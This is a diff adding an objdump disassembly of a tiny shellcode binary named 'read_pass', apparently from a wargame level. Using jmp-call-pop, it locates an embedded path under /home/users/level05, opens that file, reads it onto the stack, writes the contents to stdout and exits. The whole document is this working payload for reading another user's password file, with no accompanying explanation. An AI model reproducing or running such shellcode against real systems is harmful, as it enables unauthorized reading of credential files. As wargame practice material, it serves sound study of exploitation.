@@ -1,0 +1,60 @@
+
+read_pass:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <_start>:
+ 8049000:	eb 3f                	jmp    8049041 <_push_filename>
+
+08049002 <_readfile>:
+ 8049002:	5f                   	pop    edi
+ 8049003:	80 77 0b 41          	xor    BYTE PTR [edi+0xb],0x41
+ 8049007:	48                   	dec    eax
+ 8049008:	31 c0                	xor    eax,eax
+ 804900a:	04 02                	add    al,0x2
+ 804900c:	48                   	dec    eax
+ 804900d:	31 f6                	xor    esi,esi
+ 804900f:	0f 05                	syscall 
+ 8049011:	66 81 ec ff 0f       	sub    sp,0xfff
+ 8049016:	48                   	dec    eax
+ 8049017:	8d 34 24             	lea    esi,[esp]
+ 804901a:	48                   	dec    eax
+ 804901b:	89 c7                	mov    edi,eax
+ 804901d:	48                   	dec    eax
+ 804901e:	31 d2                	xor    edx,edx
+ 8049020:	66 ba ff 0f          	mov    dx,0xfff
+ 8049024:	48                   	dec    eax
+ 8049025:	31 c0                	xor    eax,eax
+ 8049027:	0f 05                	syscall 
+ 8049029:	48                   	dec    eax
+ 804902a:	31 ff                	xor    edi,edi
+ 804902c:	40                   	inc    eax
+ 804902d:	80 c7 01             	add    bh,0x1
+ 8049030:	48                   	dec    eax
+ 8049031:	89 c2                	mov    edx,eax
+ 8049033:	48                   	dec    eax
+ 8049034:	31 c0                	xor    eax,eax
+ 8049036:	04 01                	add    al,0x1
+ 8049038:	0f 05                	syscall 
+ 804903a:	48                   	dec    eax
+ 804903b:	31 c0                	xor    eax,eax
+ 804903d:	04 3c                	add    al,0x3c
+ 804903f:	0f 05                	syscall 
+
+08049041 <_push_filename>:
+ 8049041:	e8 bc ff ff ff       	call   8049002 <_readfile>
+
+08049046 <path>:
+ 8049046:	2f                   	das    
+ 8049047:	68 6f 6d 65 2f       	push   0x2f656d6f
+ 804904c:	75 73                	jne    80490c1 <path+0x7b>
+ 804904e:	65 72 73             	gs jb  80490c4 <path+0x7e>
+ 8049051:	2f                   	das    
+ 8049052:	6c                   	ins    BYTE PTR es:[edi],dx
+ 8049053:	65 76 65             	gs jbe 80490bb <path+0x75>
+ 8049056:	6c                   	ins    BYTE PTR es:[edi],dx
+ 8049057:	30 35 2f 6c 65 76    	xor    BYTE PTR ds:0x76656c2f,dh
+ 804905d:	65 6c                	gs ins BYTE PTR es:[edi],dx
+ 804905f:	30                   	.byte 0x30
+ 8049060:	35                   	.byte 0x35
